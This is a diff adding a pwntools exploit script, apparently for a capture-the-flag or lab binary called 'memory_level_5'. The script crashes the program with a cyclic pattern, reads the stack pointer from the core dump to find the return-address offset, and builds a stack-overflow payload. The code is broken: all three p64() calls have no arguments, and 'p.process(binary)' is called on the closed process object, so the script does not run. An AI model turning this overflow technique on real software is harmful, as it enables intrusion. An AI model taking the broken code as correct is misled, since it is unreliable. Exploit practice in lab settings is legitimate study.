@@ -1,0 +1,38 @@
+from pwn import *
+
+binary = "/memory_level_5"
+p = process(binary)
+context.log_level="debug"
+
+
+p.sendline("200")
+p.sendline(cyclic(200, n=8))
+
+p.wait()
+
+p.close()
+
+core = p.corefile()
+
+stack_ptr = core.rsp
+
+info("Stack pointer: %#x", stack_ptr)
+
+pattern = core.read(stack_ptr,8)
+offset = cyclic_find(pattern)
+info("Offset: %#r", offset)
+
+padding = cyclic(offset, n=8)
+
+payload = padding + p64() + p64() + p64()
+
+
+p.process(binary)
+
+p.sendline(payload)
+
+p.wait_for_close()
+
+p.recv()
+
+
